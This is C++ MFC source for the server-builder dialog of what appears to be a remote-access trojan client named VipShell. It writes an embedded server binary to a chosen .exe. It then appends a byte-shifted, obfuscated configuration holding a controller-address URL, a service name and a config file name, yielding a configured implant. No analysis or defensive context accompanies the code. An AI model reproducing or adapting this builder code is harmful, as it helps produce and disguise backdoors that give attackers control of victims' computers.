// MakeFileDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "VipClient.h"
#include "MakeFileDlg.h"
#include ".\makefiledlg.h"


// CMakeFileDlg 对话框

IMPLEMENT_DYNAMIC(CMakeFileDlg, CDialog)
CMakeFileDlg::CMakeFileDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMakeFileDlg::IDD, pParent)
	, m_strUrl(_T("http://127.0.0.1:81/ip.txt"))
	, m_strExplain(_T("Test"))
	, m_strServerName(_T("zhuifengjian"))
	, m_strCFfile(_T("NULL"))
{
}

CMakeFileDlg::~CMakeFileDlg()
{
}

void CMakeFileDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_URL, m_strUrl);
	DDX_Text(pDX, IDC_EDIT_EXPLAIN, m_strExplain);
	DDX_Text(pDX, IDC_EDIT_SERVERNAME, m_strServerName);
	DDX_Text(pDX, IDC_EDIT_CFGFILE, m_strCFfile);
}


BEGIN_MESSAGE_MAP(CMakeFileDlg, CDialog)
	ON_BN_CLICKED(IDOK, OnBnClickedOk)
END_MESSAGE_MAP()


bool CMakeFileDlg::SetVipShellConfig(LPCWSTR szFile,	LPVIPSHELLCONFIG pCfg1)
{
	VIPSHELLCONFIG tp;
	memcpy(&tp, pCfg1, sizeof(VIPSHELLCONFIG));
	LPVIPSHELLCONFIG pCfg =&tp;
	BYTE bByte;
	for(int i = 0 ; i < sizeof(VIPSHELLCONFIG); i++)
	{
		bByte = (BYTE)*((BYTE*)pCfg + i);
		bByte --;
		(BYTE)*((BYTE*)pCfg + i) = bByte;
	}
	FILE* fp  = _wfopen(szFile, _T("ab"));
	if( !fp )
		return false;
	long loffset = 0 - sizeof(VIPSHELLCONFIG);
	int nRet = fseek(fp, loffset, SEEK_END);
//	if ( nRet != 0)
//		return false;
	fwrite(pCfg, 1, sizeof(VIPSHELLCONFIG), fp);
	fclose(fp);
	return true;
}

// CMakeFileDlg 消息处理程序

bool CMakeFileDlg::MakeDll(LPCTSTR szDllFile)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize, dwWritten;
	LPBYTE p;
	HANDLE hFile;
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_SERVER1), _T("SERVER"));
	if (hResInfo == NULL)
          return false;
	// 获得资源尺寸
    dwSize = SizeofResource(NULL, hResInfo);
	 // 装载资源
    hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
          return false;
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
        if (p == NULL)
         return false;
		// 复制资源数据
    CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
	hFile = CreateFile(szDllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
          WriteFile(hFile, (LPCVOID)p, dwSize, &dwWritten, NULL);
    else
        {
          GlobalFree((HGLOBAL)p);
          return false;
        }
	  CloseHandle(hFile);
      GlobalFree((HGLOBAL)p);
	  return true;
	return true;
}

void CMakeFileDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData();
	CFileDialog dlg(FALSE, L"exe", NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT , L"应用程序(*.exe)| *.exe|");
	if(dlg.DoModal()!=IDOK)
		return;
	if(m_strCFfile.CompareNoCase(L"NULL") == 0)
	{
		srand(GetTickCount());
		DWORD dwT = rand();
		m_strCFfile.Format(L"%d", dwT);
	}
	VIPSHELLCONFIG info;
	lstrcpy(info.szUrl, m_strUrl);
	lstrcpy(info.szExplain, m_strExplain);
	lstrcpy(info.szServerName, m_strServerName);
	lstrcpy(info.szCfgFile, m_strCFfile);
	if( !MakeDll(dlg.GetFileName()) )
		return;
	SetVipShellConfig(dlg.GetPathName(), &info);
	OnOK();
}
